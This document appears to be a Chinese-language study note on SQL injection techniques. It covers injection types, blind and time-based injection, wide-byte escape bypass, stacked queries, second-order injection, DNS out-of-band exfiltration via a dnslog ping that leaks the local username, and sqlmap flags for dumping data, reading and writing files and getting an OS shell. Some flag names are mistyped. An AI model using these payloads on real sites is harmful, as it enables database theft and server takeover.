sql 注入类型

Type Description
数字型 id=1
字符型 id=’1’
搜索型 闭合%’ and ‘%’=’
编码型 数据以编码值传递
加密型 数据以加密的md5发送
格式型 JSON

提交方式

Type Description
get url传递参数
post 与网站功能点有关
cookie JWT反序列化
server 记录XFF头信息，浏览器信息，当前访问url地址
XFF 密码错误N次机会，考虑通过XFF的ip或cookie判断用户身份

高权限读写文件

盲注

功能点

Type Description
select 布尔盲注
insert 报错盲注
updata 报错盲注
delete 延时注入
  • 查询方法增删改查四种特性决定，此类注入基本采用盲注黑盒测试：可以通过功能点判断注入
  • 查询方式四种特性决定应用功能点（会员注册，删除新闻，修改文章等）

逻辑

延迟

  • 利用 sleep()返回时间判断：但是可能会有网速干扰

报错

宽字节注入

单引号被转义 ‘ 被转义成 ‘\ 使用%df 组合成\%df 可以吃掉反斜杠
代码中存在 addslashes () 之类的转义函数
存在 tamper 脚本 sqlmap ummagic

堆叠注入

  • 取决于数据库支持否多条语句执行
  • 使用; 号结束前面的语句后构造自己的语句
  • select * from news where id=1; select user ();

强网杯随便注
绕过进行16进制编码

二次注入

  • 插入恶意数据,引用恶意数据
  • 找回密码逻辑经常出现
  • 注册用户的时候用恶意用户名
    • 然后修改密码会调用这个恶意用户名

DNS 注入

  • 需要能使用 load_file 类似
  • secure_file_priv 为””
  • 解决不回显，反向链接，sql 注入，命令执行，ssrf 等
  • ping %USERHOME%. dnslog. cn 返回本地电脑用户名
  • 命令执行中好用

sqlmap

order info
sqlmap -u “url” 判断是否存在注入点
—is-dba 判断是否为数据库管理员
—dbs 获取所有数据库
current-db 获取当前数据库
—tables 获取所有数据库的表 -D “数据库” 指定数据库
—columns 获取表下面的列名 -T -D
—dump 获取数据 -C -T -D
—purge 清除缓存如果同一个网站的话会影响判断
sqlmap -r 1. txt 登录后的界面或者指定注入点 post 提交 * 号指明注入点
—os —os-cmd —os-shell 命令执行
—file-read 文件读取
—file-write —file-desk 文件写入
